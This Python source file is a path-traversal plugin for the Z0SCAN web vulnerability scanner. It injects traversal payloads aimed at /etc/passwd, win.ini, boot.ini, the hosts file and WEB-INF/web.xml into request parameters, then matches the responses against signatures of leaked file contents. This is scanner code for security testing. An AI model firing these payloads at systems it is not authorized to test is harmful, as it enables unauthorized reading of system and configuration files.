#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2019/7/8
# JiuZero 2025/5/8

import copy
import re
from urllib.parse import unquote, quote
from lib.core.log import logger
from concurrent.futures import ThreadPoolExecutor, as_completed
from api import generateResponse, updateJsonObjectFromStr, conf, KB, PLACE, VulType, POST_HINT, PluginBase, Type
from lib.core.settings import DEFAULT_GET_POST_DELIMITER, DEFAULT_COOKIE_DELIMITER


class Z0SCAN(PluginBase):
    name = "trave-path"
    desc = 'Path Traversal'
    version = "2025.5.8"
    risk = 2

    def condition(self, iterdatas):
        if conf.level == 0 or not 2 in conf.risk or self.fingerprints.waf:
            return False
        for _ in iterdatas:
            key, value, position = _
            if ("." in value or "/" in value) or (key.lower() in ['filename', 'file', 'path', 'filepath']):
                return True
        return False
    
    def generate_payloads(self):
        payloads = []
        default_extension = ".jpg"
        payloads.append("../../../../../../../../../../../etc/passwd%00")
        payloads.append("/etc/passwd")
        if "LINUX" in self.fingerprints.os or"DARWIN" in self.fingerprints.os:
            payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
            payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
        if "WINDOWS" in self.fingerprints.os:
            payloads.append("../../../../../../../../../../windows/win.ini")
            payloads.append("C:\\boot.ini")
            # if origin:
            #     payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
            payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
        if "JAVA" in self.fingerprints.programing:
            payloads.append("/WEB-INF/web.xml")
            payloads.append("../../WEB-INF/web.xml")
        return payloads

    def audit(self):
        iterdatas = self.generateItemdatas()
        if not self.condition(iterdatas):
            return
        plainArray = [
            r"; for 16-bit app support",
            r"[MCI Extensions.BAK]",
            r"# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.",
            r"# localhost name resolution is handled within DNS itself.",
            r"[boot loader]"
        ]

        regexArray = [
            r'(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)',
            r'(root:\w:\d*:)',
            r"System\.IO\.FileNotFoundException: Could not find file\s'\w:",
            r"System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s'\w:",
            r"<b>Warning<\/b>:\s\sDOMDocument::load\(\)\s\[<a\shref='domdocument.load'>domdocument.load<\/a>\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s<b>.*?<\/b>\son\sline\s<b>\d+<\/b>",
            r"(<web-app[\s\S]+<\/web-app>)",
            r"Warning: fopen\(",
            r"open_basedir restriction in effect",
            r'/bin/(bash|sh)[^\r\n<>]*[\r\n]',
            r'\[boot loader\][^\r\n<>]*[\r\n]'
        ]
        payloads = self.generate_payloads()
        with ThreadPoolExecutor(max_workers=None) as executor:
            futures = [
                executor.submit(self.process, _, payloads, plainArray, regexArray) for _ in iterdatas
            ]
            try:
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as task_e:
                        logger.error(f"Task failed: {task_e}", origin=self.name)
                        raise
            except KeyboardInterrupt:
                executor.shutdown(wait=False)
            except Exception as e:
                logger.error(f"Unexpected error: {e}", origin=self.name)
                executor.shutdown(wait=False)
                
    def process(self, _, payloads, plainArray, regexArray):
        k, v, position = _
        for _payload in payloads:
            payload = self.insertPayload({
                "key": k, 
                "value": v, 
                "position": position, 
                "payload": _payload
                })
            r = self.req(position, payload)
            if not r:
                continue
            html1 = r.text
            for plain in plainArray:
                if plain in html1:
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": self.requests.url, 
                        "vultype": VulType.PATH_TRAVERSAL, 
                        "show": {
                            "Position": r"{position} > {k}", 
                            "Payload": payload
                            }
                        })
                    result.step("Request1", {
                        "request": r.reqinfo, 
                        "response": generateResponse(r), 
                        "desc": "Payload: {} Match: {}".format(payload, plain)
                        })
                    self.success(result)
                    return
            for regex in regexArray:
                if re.search(regex, html1, re.I | re.S | re.M):
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": self.requests.url, 
                        "vultype": VulType.PATH_TRAVERSAL, 
                        "show": {
                            "Position": r"{position} > {k}", 
                            "Payload": payload
                            }
                        })
                    result.step("Request1", {
                        "request": r.reqinfo, 
                        "response": generateResponse(r), 
                        "desc": "Payload: {} Match: {}".format(payload, regex)
                        })
                    self.success(result)
                    return
